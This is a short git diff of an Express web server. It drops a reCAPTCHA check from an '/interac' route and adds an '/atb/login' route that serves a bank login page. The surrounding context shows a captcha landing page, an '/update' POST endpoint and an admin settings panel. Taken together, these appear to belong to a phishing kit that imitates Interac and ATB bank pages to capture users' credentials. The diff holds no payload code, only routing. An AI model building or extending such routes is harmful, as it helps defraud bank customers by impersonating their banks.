@@ -221,8 +221,8 @@ app.get('/', (req, res) => {
     res.render('captcha/index')
 })
 
-app.get('/interac', verifyRecaptcha, (req, res) => {
-    res.render('captcha/index')
+app.get('/interac', (req, res) => {
+    res.render('interac/index')
 })
 
 app.post('/update', async (req, res) => {
@@ -311,6 +311,11 @@ app.get('/admin/settings', checkAdminSession, async (req, res) => {
         res.render('admin/settings/index', { data: null, message: 'Error retrieving settings. Contact webcro help.' });
     }
 });
+
+app.get('/atb/login', (req, res) => {
+    res.render('bank/atb/login/index');
+})
+
 
 
 
